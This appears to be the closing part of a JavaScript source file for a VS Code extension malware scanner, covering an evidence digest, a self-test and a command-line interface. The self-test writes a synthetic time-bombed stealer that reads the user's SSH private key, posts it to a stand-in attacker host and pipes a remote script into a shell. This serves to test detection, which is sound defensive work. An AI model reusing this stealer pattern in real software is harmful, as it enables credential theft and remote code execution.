        destinations: (result.stolen.destinations || []).slice(0, 20),
        flows: (result.stolen.flows || []).slice(0, 20),
        secrets_read: result.stolen.secrets_read,
      } : {},
      behaviours: (result.forensic && result.forensic.behaviours || [])
        .map((b) => ({ title: b.title, technique: b.technique, evidence: (b.evidence || []).slice(0, 4) })),
      hosts: ((result.forensic && result.forensic.iocs && result.forensic.iocs.hosts) || []).slice(0, 30),
      time_machine: result.time_machine || {},
      timed_out: !!result.timed_out,
      duration_ms: result.duration_ms != null ? result.duration_ms : null,
    };
  }

  // ── LLM helper: compact, promptable digest of the evidence  [EXTENSION POINT]
  static digest(evidence) {
    const d = evidence.dynamic || {}, s = evidence.static || {};
    const sum = d.summary || {};
    return {
      sample: evidence.sample, version: evidence.version,
      static:  { verdict: (s.verdict || {}).verdict, score: (s.verdict || {}).score,
                 iocs: (s.iocs || []).map((i) => i.reason), invisible_unicode: s.invisible_unicode || 0 },
      dynamic: { verdict: (d.verdict || {}).verdict, score: (d.verdict || {}).score,
                 purpose: (d.intel || {}).purpose,
                 events: sum.total_events || 0, http: sum.http_requests || 0,
                 exec: sum.child_process_calls || 0, eval: sum.eval_calls || 0,
                 hosts: sum.unique_hosts_contacted || [], commands: sum.shell_commands_attempted || [],
                 outbound: (d.outbound_messages || []).map((b) => ({ to: b.host || b.destination, method: b.method, body: clip(b.decoded || b.body, 200) })),
                 stolen: sum.stolen_categories || [],
                 taint_flows: (d.stolen_data && d.stolen_data.flows) || [] },
    };
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  Self-test — builds a synthetic time-gated stealer and proves the pipeline
//  detonates it. Great for "does my checkout work?" and CI.
// ═════════════════════════════════════════════════════════════════════════════
async function selfTest() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vexguard-selftest-'));
  fs.writeFileSync(path.join(dir, 'package.json'),
    JSON.stringify({ name: 'selftest', publisher: 'vexguard', version: '0.0.1', main: 'extension.js' }));
  fs.writeFileSync(path.join(dir, 'extension.js'), [
    "const cp = require('child_process');",
    "const https = require('https');",
    "const fs = require('fs');",
    "const os = require('os');",
    "const path = require('path');",
    "function activate() {",
    "  // Time-gated payload 90 DAYS out — invisible to a passive-wait sandbox,",
    "  // detonated instantly by the Time Machine fast-forward.",
    "  setTimeout(() => {",
    "    if (process.platform !== 'win32') return;   // OS gate",
    "    let loot = '';",
    "    try { loot = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8'); } catch (e) {}",
    "    const req = https.request({ hostname:'evil-c2.example.com', path:'/x', method:'POST' });",
    "    req.write(JSON.stringify({ stolen: loot })); req.end();",
    "    cp.exec('curl http://evil.example/p.sh | sh');",
    "  }, 90*24*3600*1000);",
    "}",
    "module.exports = { activate };",
  ].join('\n'));

  const vg = new VEXGuard({ output: path.join(dir, 'out'), fast: true });
  vg.on('dynamic:done', (r) => console.log(`  [selftest] dynamic events=${(r && r.summary && r.summary.total_events) || 0}, outbound=${((r && r.outbound_messages) || []).length}`));
  const res = await vg.analyze(dir);

  const beaconHit = (res.forensic.iocs.hosts || []).some((h) => /evil-c2/.test(h));
  const taintHit  = !!(res.stolen && res.stolen.data_stolen);
  const ok = res.final.verdict === 'MALICIOUS' && beaconHit && taintHit;
  console.log(`  [selftest] verdict=${res.final.verdict} score=${res.final.score} beacon=${beaconHit} provenTaintFlow=${taintHit}`);
  if (taintHit) for (const f of (res.stolen.flows || [])) console.log(`  [selftest] flow: ${f.category}  ${f.source} → ${f.sink}`);
  console.log(ok ? '✅ SELFTEST PASS — OS-gated, 90-day time-bombed stealer detonated, exfil proven end-to-end.'
                 : '❌ SELFTEST FAIL');
  rmrf(dir);
  return ok;
}

// ═════════════════════════════════════════════════════════════════════════════
//  CLI
// ═════════════════════════════════════════════════════════════════════════════
function parseArgs(argv) {
  const a = { _: [], flags: {} };
  for (let i = 2; i < argv.length; i++) {
    const k = argv[i];
    if (k.startsWith('--')) {
      const key = k.slice(2);
      const next = argv[i + 1];
      if (next && !next.startsWith('--')) { a.flags[key] = next; i++; } else a.flags[key] = true;
    } else a._.push(k);
  }
  return a;
}

const pct = (x) => `${(x * 100).toFixed(1)}%`;

async function main() {
  const args = parseArgs(process.argv);
  const banner = () => { console.log('═'.repeat(64)); console.log('  VEXGuard — VS Code Extension Guard  v3'); console.log('═'.repeat(64)); };

  if (args.flags.selftest) { banner(); process.exit((await selfTest()) ? 0 : 1); }

  if (args.flags.evaluate) {
    const csv = String(args.flags.evaluate);
    const rows = DATASET.parseCsv(fs.readFileSync(csv, 'utf8'));
    const vg = new VEXGuard();
    banner();
    for (const [title, key] of [['STRICT (positive = MALICIOUS)', 'final_is_malicious'],
                                ['TRIAGE (positive = MALICIOUS or SUSPICIOUS)', 'final_is_flagged']]) {
      const m = vg.evaluate(rows, key);
      console.log(`\n  ${title}`);
      console.log(`  TP=${m.TP} FP=${m.FP} FN=${m.FN} TN=${m.TN}   (n=${m.total})`);
      console.log(`  Precision ${pct(m.precision)}  Recall ${pct(m.recall)}  F1 ${pct(m.f1)}  Accuracy ${pct(m.accuracy)}`);
    }
    return;
  }

  const vg = new VEXGuard({
    output:   args.flags.out ? String(args.flags.out) : undefined,
    platform: args.flags.platform ? String(args.flags.platform) : undefined,
    maxVirtualMs: args.flags['max-virtual-ms'] ? Number(args.flags['max-virtual-ms']) : undefined,
    timeout:  args.flags.timeout ? Number(args.flags.timeout) : undefined,
    fast:     !!args.flags.fast || !!args.flags.dataset,
    keepUnpacked: !!args.flags['keep-unpacked'],
  });

  if (args.flags.dataset) {
    banner();
    const outDir = vg.output;
    const name   = path.basename(DATASET.unwrapRoot(String(args.flags.dataset)));
    vg.on('dataset:start', (e) => {
      console.log(`  Dataset  : ${e.dataset}  (${e.total} samples, ${e.skipped} already done)`);
      console.log(`  Workers  : ${e.concurrency}`);
      console.log(`  Tiers    : ${JSON.stringify(e.stats.tiers)}`);
      console.log('─'.repeat(64));
    });
    let t0 = Date.now();
    vg.on('dataset:progress', (e) => {
      const icon = e.row.final_verdict === 'MALICIOUS' ? '🔴' : e.row.final_verdict === 'SUSPICIOUS' ? '🟡'
                 : e.row.final_verdict === 'ERROR' ? '⚠️' : '🟢';
      const rate = (Date.now() - t0) / Math.max(1, e.i) / 1000;
      const eta  = ((e.total - e.i) * rate / 60).toFixed(1);
      process.stdout.write(`  [${String(e.i).padStart(5)}/${e.total}] ${icon} ${String(e.row.id).slice(0, 46).padEnd(46)} ${String(e.row.final_verdict).padEnd(10)} eta ${eta}m\n`);
    });

    const { rows, metrics, stats } = await vg.analyzeDataset(String(args.flags.dataset), {
      label:       args.flags.label != null && args.flags.label !== true ? Number(args.flags.label) : undefined,
      concurrency: args.flags.concurrency ? Number(args.flags.concurrency) : undefined,
      limit:       args.flags.limit ? Number(args.flags.limit) : undefined,
      latestOnly:  !!args.flags['latest-only'],
      staticOnly:  !!args.flags['static-only'],
      resume:      !!args.flags.resume,
      includeTiers: args.flags.tiers && args.flags.tiers !== true ? String(args.flags.tiers) : undefined,
      excludeTiers: args.flags['exclude-tiers'] && args.flags['exclude-tiers'] !== true ? String(args.flags['exclude-tiers']) : undefined,
      csv:         path.join(outDir, `results-${safeName(name)}.csv`),
      jsonl:       path.join(outDir, `results-${safeName(name)}.jsonl`),
    });

    console.log('─'.repeat(64));
    console.log(`  Samples analysed : ${rows.length}   (discovered ${stats.total_discovered})`);
    console.log(`  MALICIOUS ${rows.filter((r) => r.final_verdict === 'MALICIOUS').length}   SUSPICIOUS ${rows.filter((r) => r.final_verdict === 'SUSPICIOUS').length}   BENIGN ${rows.filter((r) => r.final_verdict === 'BENIGN').length}   ERROR ${rows.filter((r) => r.final_verdict === 'ERROR').length}`);
    if (metrics.total) {
      console.log(`  STRICT : TP=${metrics.TP} FP=${metrics.FP} FN=${metrics.FN} TN=${metrics.TN}  P ${pct(metrics.precision)} R ${pct(metrics.recall)} F1 ${pct(metrics.f1)}`);
      const t = vg.evaluate(rows, 'final_is_flagged');
      console.log(`  TRIAGE : TP=${t.TP} FP=${t.FP} FN=${t.FN} TN=${t.TN}  P ${pct(t.precision)} R ${pct(t.recall)} F1 ${pct(t.f1)}`);
    }
    console.log(`  CSV → ${path.join(outDir, `results-${safeName(name)}.csv`)}`);
    return;
  }

  const target = args._[0];
  if (!target) {
    console.error('usage: node VEXGuard.js <target.vsix|dir> [--json] [--static|--dynamic] [--out DIR] [--platform win32]');
    console.error('       node VEXGuard.js --dataset DIR [--label 1] [--concurrency 8] [--limit N] [--latest-only] [--resume]');
    console.error('       node VEXGuard.js --evaluate results.csv');
    console.error('       node VEXGuard.js --selftest');
    process.exit(1);
  }

  vg.on('sample:start', (e) => console.error(`  → analyzing ${e.target}`));
  vg.on('static:done',  (s) => console.error(`    static  : ${(s && s.verdict && s.verdict.verdict) || 'n/a'}`));
  vg.on('dynamic:done', (d) => console.error(`    dynamic : ${(d && d.verdict && d.verdict.verdict) || 'n/a'}  (events ${(d && d.summary && d.summary.total_events) || 0})`));

  banner();
  if (args.flags.static) {
    const res = await vg.analyze(target, { staticOnly: true });
    console.log(JSON.stringify(res.static, null, 2));
    return;
  }
  if (args.flags.dynamic) {
    const res = await vg.analyze(target, { dynamicOnly: true });
    console.log(JSON.stringify(res.dynamic, null, 2));
    return;
  }

  const res = await vg.analyze(target);
  if (args.flags.json) { console.log(JSON.stringify(res, null, 2)); return; }
  const icon = res.final.verdict === 'MALICIOUS' ? '🔴' : res.final.verdict === 'SUSPICIOUS' ? '🟡' : '🟢';
  console.log(`\n  ${icon} ${res.sample}  →  ${res.final.verdict}  (score ${res.final.score}, by ${res.final.decided_by})`);
  console.log('  ' + '─'.repeat(60));
  console.log(res.forensic.markdown);
}

module.exports = { VEXGuard, RuleVerdictEngine, MitreForensicEngine, selfTest, pool, runNode, CsvSink };

if (require.main === module) {
  main().catch((e) => { console.error('[VEXGuard FATAL]', e && e.message); process.exit(1); });
}
